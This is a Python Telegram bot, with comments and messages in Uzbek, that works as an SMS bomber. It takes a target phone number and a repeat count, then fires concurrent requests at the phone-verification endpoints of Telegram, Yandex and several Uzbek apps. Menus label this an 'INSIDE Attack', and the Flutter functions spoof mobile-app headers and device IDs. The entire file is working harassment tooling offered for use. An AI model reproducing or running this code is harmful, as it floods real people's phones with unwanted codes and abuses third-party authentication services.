#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
NOTBSIDE Telegram Bot - 100% MUSTAQIL VA TOZA KOD
Hech qanday tashqi papka (Core, INSIDE-main) talab qilmaydi.
"""
import asyncio
import os
import random
import string
from aiohttp import ClientSession, web
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

# ==================== SOZLAMALAR ====================
BOT_TOKEN = os.getenv("BOT_TOKEN", "SIZNING_TOKENINGIZNI_SHU_YERGA_YOZING")
ADMIN_IDS = [int(x) for x in os.getenv("ADMIN_IDS", "7472073326").split(",")]

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

# ==================== TAYYOR API'LAR ====================
SERVICES_LIST = [
    {
        'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Telegram.org'},
        'method': 'post',
        'url': 'https://my.telegram.org/auth/send_password',
        'data': {'phone': '{number}'},
    },
    {
        'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Telegram Oauth'},
        'method': 'post',
        'url': 'https://oauth.telegram.org/auth/request?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&return_to=https%3A%2F%2Fbot-t.com%2Flogin',
        'data': {'phone': '{number}'},
    },
    {
        'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Yandex.ru'},
        'method': 'post',
        'url': 'https://passport.yandex.ru/registration-validations/phone-confirm-code-submit',
        'data': {'number': '+{number}'},
    },
    {
        'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'DavrMobile.uz'},
        'method': 'post',
        'url': 'https://davrmobile.uz/api/v1/auth/registration/{number}/verification/request?lang=ru&platform=WEB',
        'data': {'lang': 'ru', 'platform': 'WEB'},
    }
]

# ==================== YORDAMCHI FUNKSIYALAR ====================
def filter_services(services, number):
    if number.startswith("998"):
        return [s for s in services if s["info"]["country"] in ["UZ", "ALL"]], "O'zbekiston 🇺🇿"
    elif number.startswith("7"):
        return [s for s in services if s["info"]["country"] in ["RU", "ALL"]], "Rossiya 🇷🇺"
    else:
        return [s for s in services if s["info"]["country"] == "ALL"], "Noma'lum 🌍"

async def send_request(session, service, number):
    try:
        url = service['url'].replace('{number}', number)
        data = {}
        if 'data' in service:
            for k, v in service['data'].items():
                if isinstance(v, str):
                    data[k] = v.replace('{number}', number)
                else:
                    data[k] = v

        async with session.request(service['method'], url, data=data, timeout=10) as resp:
            text = await resp.text()
            kw = ["sent", "success", "ok", "true", "отправлен", "yuborildi", "code_sent"]
            ok = any(k in text.lower() for k in kw) and 200 <= resp.status < 300
            return {"website": service["info"]["website"], "success": ok}
    except Exception:
        return None

# ==================== FLUTTER API ====================
async def send_to_yhq(session, phone):
    url = "https://yolharakatiqoidalari.uz/api/auth/login"
    try:
        async with session.post(url, headers={"Content-Type": "application/json"}, json={"phone": phone}, timeout=15) as resp:
            return {"api": "YHQ", "success": resp.status == 200}
    except: return {"api": "YHQ", "success": False}

async def send_to_aladdin(session, phone):
    url = "https://aladdin.1it.uz/v2/auth/sendVerifyCode"
    headers = {"accept-language": "uz", "accept": "application/json", "timezone": "Asia/Tashkent", "mobile-type": "original", "app-version": "4.6.0", "x-requested-with": "XMLHttpRequest", "chance-style": "Classic", "user-agent": "samsung/SM450", "authorization": "Bearer", "content-type": "application/json; charset=UTF-8"}
    body = {"app_instance_id": "5394a8c1065419c821c96b1920fcd8b8", "client_type": "app", "device_id": "44c2dfbfb2706d8c", "phone": int(phone.replace("+", "")), "utm_medium": "organic", "utm_source": "google-play"}
    try:
        async with session.post(url, headers=headers, json=body, timeout=15) as resp:
            return {"api": "Aladdin", "success": 200 <= resp.status < 300}
    except: return {"api": "Aladdin", "success": False}

async def send_to_202(session, phone):
    url = "https://goldenfish.1it.uz/v1/oauth/"
    headers = {"Accept-Language": "uz", "Accept": "application/json", "Timezone": "Asia/Tashkent", "Mobile-Type": "original", "App-Version": "1.8.1", "X-Requested-With": "XMLHttpRequest", "Chance-Style": "Classic", "User-Agent": "samsung/SM-A105F/30", "Authorization": "Bearer", "Content-Type": "application/x-www-form-urlencoded"}
    body = f"phone={phone.replace('+', '')}&app_instance_id=ba491ef5bea8630c5ae92bb5cb7135e7&device_id=eFHXJHxGR6etcVQHwkzCSE"
    try:
        async with session.post(url, headers=headers, data=body, timeout=15) as resp:
            return {"api": "202", "success": resp.status == 200}
    except: return {"api": "202", "success": False}

async def send_flutter_batch(phone):
    async with ClientSession() as session:
        return await asyncio.gather(send_to_yhq(session, phone), send_to_aladdin(session, phone), send_to_202(session, phone))

async def run_flutter_apis(number, count):
    phone = f"+{number}"
    results = []
    for i in range(0, count, 10):
        current = min(10, count - i)
        tasks = [send_flutter_batch(phone) for _ in range(current)]
        results.extend(await asyncio.gather(*tasks))
    yhq = sum(1 for b in results for r in b if r["api"] == "YHQ" and r["success"])
    aladdin = sum(1 for b in results for r in b if r["api"] == "Aladdin" and r["success"])
    api202 = sum(1 for b in results for r in b if r["api"] == "202" and r["success"])
    return {"batches": len(results), "total_requests": len(results) * 3, "total_success": yhq + aladdin + api202, "yhq": yhq, "aladdin": aladdin, "api202": api202}

# ==================== HOLATLAR ====================
class States(StatesGroup):
    inside_number = State()
    inside_circles = State()
    inside_confirm = State()
    flutter_number = State()
    flutter_count = State()
    flutter_confirm = State()

# ==================== HANDLERLAR ====================
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    if message.from_user.id not in ADMIN_IDS:
        await message.answer(f"⛔ Ruxsat yo'q. ID: {message.from_user.id}")
        return
    kb = types.ReplyKeyboardMarkup(keyboard=[
        [types.KeyboardButton(text="🚀 INSIDE Attack")],
        [types.KeyboardButton(text="📨 Flutter API (3 ta)")]
    ], resize_keyboard=True)
    await message.answer("💎 <b>NOTBSIDE Bot (Mustaqil)</b>\n\nUsulni tanlang:", parse_mode="HTML", reply_markup=kb)

@dp.message(Command("cancel"))
async def cmd_cancel(message: types.Message, state: FSMContext):
    await state.clear()
    await message.answer("❌ Bekor qilindi.")

@dp.message(F.text == "🚀 INSIDE Attack")
async def inside_start(message: types.Message, state: FSMContext):
    if message.from_user.id not in ADMIN_IDS: return
    await state.set_state(States.inside_number)
    await message.answer("📱 Raqamni kiriting (998901234567):")

@dp.message(States.inside_number)
async def inside_num(message: types.Message, state: FSMContext):
    n = message.text.strip().replace("+", "")
    if not n.isdigit() or len(n) < 9:
        await message.answer("❌ Faqat raqamlar:"); return
    await state.update_data(number=n)
    await state.set_state(States.inside_circles)
    await message.answer("🔁 Necha marta? (1-50):")

@dp.message(States.inside_circles)
async def inside_circ(message: types.Message, state: FSMContext):
    if not message.text.isdigit():
        await message.answer("❌ Son:"); return
    c = int(message.text)
    if c < 1 or c > 50:
        await message.answer("❌ 1-50:"); return
    await state.update_data(circles=c)
    data = await state.get_data()
    await message.answer(f"⚠️ <b>Tasdiqlang:</b>\n📱 {data['number']}\n🔁 {data['circles']}\n\n<b>ha</b> yozing:", parse_mode="HTML")
    await state.set_state(States.inside_confirm)

@dp.message(States.inside_confirm)
async def inside_confirm(message: types.Message, state: FSMContext):
    if message.text.strip().lower() not in ["ha", "yes", "y", "xa"]:
        await message.answer("❌ Bekor."); await state.clear(); return
    d = await state.get_data()
    await state.clear()
    
    status = await message.answer("🚀 <b>Boshlandi...</b>", parse_mode="HTML")
    total_req = total_ok = 0
    
    main_services, country = filter_services(SERVICES_LIST, d["number"])
    
    for i in range(d["circles"]):
        await status.edit_text(f"🔄 Circle {i+1}/{d['circles']} | Yuborilmoqda...", parse_mode="HTML")
        
        async with ClientSession() as session:
            tasks = [send_request(session, srv, d["number"]) for srv in main_services]
            results = await asyncio.gather(*tasks)
            
        valid = [r for r in results if r is not None]
        ok = [r for r in valid if r.get("success")]
        
        total_req += len(valid); total_ok += len(ok)
        
        text = f"✅ <b>Circle {i+1}/{d['circles']}</b>\n🌍 {country}\n📤 {len(valid)} so'rov\n✓ SMS: <b>{len(ok)}</b>\n"
        await status.edit_text(text, parse_mode="HTML")
        if i < d["circles"] - 1: await asyncio.sleep(3)
        
    final = f"🏁 <b>Yakunlandi</b>\n\n📊 Jami so'rovlar: {total_req}\n📨 SMS yuborilgan: <b>{total_ok}</b>"
    await status.edit_text(final, parse_mode="HTML")

@dp.message(F.text == "📨 Flutter API (3 ta)")
async def flutter_start(message: types.Message, state: FSMContext):
    if message.from_user.id not in ADMIN_IDS: return
    await state.set_state(States.flutter_number)
    await message.answer("📱 Raqam (998901234567):")

@dp.message(States.flutter_number)
async def flutter_num(message: types.Message, state: FSMContext):
    n = message.text.strip().replace("+", "")
    if not n.isdigit() or len(n) < 9:
        await message.answer("❌ Faqat raqamlar:"); return
    await state.update_data(number=n)
    await state.set_state(States.flutter_count)
    await message.answer("🔁 Necha marta? (1-100):")

@dp.message(States.flutter_count)
async def flutter_count(message: types.Message, state: FSMContext):
    if not message.text.isdigit():
        await message.answer("❌ Son:"); return
    c = int(message.text)
    if c < 1 or c > 100:
        await message.answer("❌ 1-100:"); return
    await state.update_data(count=c)
    d = await state.get_data()
    await message.answer(f"⚠️ <b>Tasdiqlang:</b>\n📱 +{d['number']}\n🔁 {c} batch\n\n<b>ha</b> yozing:", parse_mode="HTML")
    await state.set_state(States.flutter_confirm)

@dp.message(States.flutter_confirm)
async def flutter_confirm(message: types.Message, state: FSMContext):
    if message.text.strip().lower() not in ["ha", "yes", "y", "xa"]:
        await message.answer("❌ Bekor."); await state.clear(); return
    d = await state.get_data()
    await state.clear()
    status = await message.answer("🚀 <b>Yuborilmoqda...</b>", parse_mode="HTML")
    r = await run_flutter_apis(d["number"], d["count"])
    final = f"🏁 <b>Yakunlandi</b>\n\n📱 +{d['number']}\n📦 Batch: {r['batches']}\n📤 Jami: {r['total_requests']}\n✅ Muvaffaqiyat: <b>{r['total_success']}</b>\n\n<b>API:</b>\n• YHQ: {r['yhq']}\n• Aladdin: {r['aladdin']}\n• 202: {r['api202']}\n"
    await status.edit_text(final, parse_mode="HTML")

# ==================== RENDER UCHUN VEB SERVER ====================
async def handle(request):
    return web.Response(text="Bot ishlayapti!")

async def start_web_server():
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 10000))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    print(f"🌐 Veb-server {port}-portda ishga tushdi")

# ==================== ISHGA TUSHIRISH ====================
async def main():
    print("🤖 Bot ishga tushmoqda...")
    asyncio.create_task(start_web_server())
    await dp.start_polling(bot)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n⛔ To'xtatildi")
